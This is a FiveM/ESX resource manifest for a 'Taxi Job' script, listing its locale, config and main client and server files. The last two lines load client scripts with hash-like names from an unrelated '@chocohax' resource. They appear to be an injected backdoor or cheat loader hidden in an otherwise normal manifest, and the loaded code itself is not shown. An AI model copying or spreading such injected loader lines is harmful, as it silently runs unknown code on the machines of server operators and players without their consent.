resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Taxi Job'

version '1.0.2'

client_scripts {
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/pl.lua',
	'locales/sv.lua',
	'config.lua',
	'client/main.lua'
}

server_scripts {
	'@es_extended/locale.lua',
	"@mysql-async/lib/MySQL.lua",
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/pl.lua',
	'locales/sv.lua',
	'config.lua',
	'server/main.lua'
}

dependency 'es_extended'
client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'